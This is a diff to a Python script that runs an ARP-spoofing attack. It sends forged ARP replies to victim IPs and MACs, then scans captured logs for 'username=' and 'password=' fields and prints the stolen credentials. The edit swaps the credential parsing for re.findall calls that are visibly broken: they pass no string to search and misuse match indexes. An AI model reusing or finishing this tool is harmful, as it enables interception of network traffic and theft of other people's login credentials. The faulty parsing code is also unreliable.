@@ -87,7 +87,6 @@ if __name__ == "__main__":
             print(" ")
             for j in range(0,len(ip)):
                 if(ip[j].split(".")[3] != "3" and ip[j].split(".")[3] != "254"):
-                    print(len(re.split(".",ip[j])))
                     victimpacket = ARP( op      =  2,
                                         pdst    = ip[j],            # victim's IP
                                         hwdst   = mac[j],           # victim's MAC 
@@ -113,9 +112,10 @@ if __name__ == "__main__":
                 with open("logdir/" + file, 'r', encoding='utf-8', errors='ignore') as f:
                     for line in f:
                         if ("username=" in line) and ("password=" in line):
-                            a = [m.start() for m in re.finditer("&", line)]
-                            b = [m.start() for m in re.finditer("=", line)]
-                            print("username= %s  password= %s" % (line[b[0]+1:a[0]], line[b[1]+1:a[1]]))
+                            username = re.findall("username=(.*?)&password=(.*?)&captcha_code=HTTP/1.1 303 See Other")[0]
+                            passwd = re.findall("username=(.*?)&password=(.*?)&captcha_code=HTTP/1.1 303 See Other")[1]
+                            print("username= %s  password= %s" %
+                                  (username, passwd))
             sending_flag = False
             sleep(1)
     finally:
